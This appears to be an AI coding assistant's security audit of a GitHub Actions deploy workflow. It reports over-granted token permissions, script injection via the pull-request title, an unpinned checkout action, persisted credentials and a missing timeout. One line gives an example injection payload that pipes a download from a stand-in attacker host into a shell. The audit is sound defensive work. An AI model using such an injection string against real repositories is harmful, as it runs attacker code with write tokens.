I couldn't find a comment-triggered agent workflow in this repo, so there's no agent token, tool list or network setting to audit.

The only GitHub Actions workflow is `.github/workflows/deploy.yml`. It triggers on `pull_request`, not `issue_comment`, and it never invokes an AI agent. It only runs `echo`. The only other match for "agent" or "claude" was the `Jenkinsfile`, which isn't GitHub Actions. If your assistant workflow lives on another branch, in another repo, or in an org-level reusable workflow, point me to it and I'll audit it.

`deploy.yml` does have problems of the kind you're asking about, though. I read it and haven't run `actionlint` or `zizmor` on it.

1. **Token over-grant (line 7):** `permissions: write-all` gives the job write access to every scope, and the job only needs to check out code. The workflow should set `permissions: {}` and give the job `contents: read`. Fork PRs get a read-only token anyway. Same-repo PRs get the full write token, and that token is exposed to the script-injection issue below.
2. **Script injection (line 14):** `${{ github.event.pull_request.title }}` is substituted straight into the `run:` script. A PR title like `"; curl evil.sh | sh #` runs as code with that write token. Pass the title through `env:` and reference it quoted as `"$PR_TITLE"`.
3. **Unpinned action (line 13):** `actions/checkout@v4` is a mutable tag. It should be pinned to a full commit SHA, resolved with `gh api` and not typed from memory.
4. **Checkout credentials (line 13):** `persist-credentials: false` isn't set, so the token stays in `.git/config` for later steps.
5. **No job timeout (line 11):** There is no `timeout-minutes`, so the default is 360 minutes.

I haven't changed anything. Do you want me to apply these fixes to `deploy.yml`, then run `actionlint` and `zizmor`? I'd also need to look up the current `checkout` release and SHA with `gh api`.
